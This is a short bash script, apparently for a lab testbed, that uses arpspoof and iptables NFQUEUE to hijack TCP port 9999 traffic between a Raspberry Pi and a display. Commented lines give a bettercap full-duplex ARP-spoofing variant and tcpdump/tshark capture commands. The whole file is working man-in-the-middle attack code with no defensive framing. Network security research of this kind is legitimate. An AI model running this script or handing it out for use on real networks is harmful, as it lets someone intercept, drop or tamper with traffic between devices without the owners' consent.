# This script is used to disconnect the Raspberry Pi and the display from the network by ARP spoofing.
#!/bin/bash
# sudo apt install bettercap

. $(dirname "$0")/config.sh
sudo iptables -I FORWARD -s  $PI_ADRESS -d  $DISPLAY_ADDRESS -p tcp --dport 9999 -j NFQUEUE --queue-num 1

sudo sysctl -w net.ipv4.ip_forward=1
sudo arpspoof -i "$INTERFACE" -t $DISPLAY_ADDRESS $PI_ADRESS
# sudo arpspoof -i "$INTERFACE" -t $PI_ADRESS $DISPLAY_ADDRESS
 
# echo "[+] Starting ARP Spoofing to $DISPLAY_ADDRESS on $INTERFACE ..."
# sudo bettercap -iface "$INTERFACE" -eval "
# set arp.spoof.targets $DISPLAY_ADDRESS,$PI_ADRESS;
# set arp.spoof.fullduplex true;
# arp.spoof on;
# "

# check traffict from PI to Disp
# sudo tcpdump -i eth1 host 192.168.157.15 and host 192.168.157.16
# sudo iptables -I FORWARD -s 192.168.157.15 -d 192.168.157.16 -p tcp --dport 9999 -j NFQUEUE --queue-num 1
# sudo iptables -L -v -n --line-numbers
# sudo iptables -S | grep NFQUEUE
# sudo iptables -D 
#  tshark -i eth1 -f "host 192.168.157.15 and host 192.168.157.16" -w output.pcap 
#  tshark -i eth1 -f "host 192.168.157.14 and host 192.168.157.194" -w output.pcap 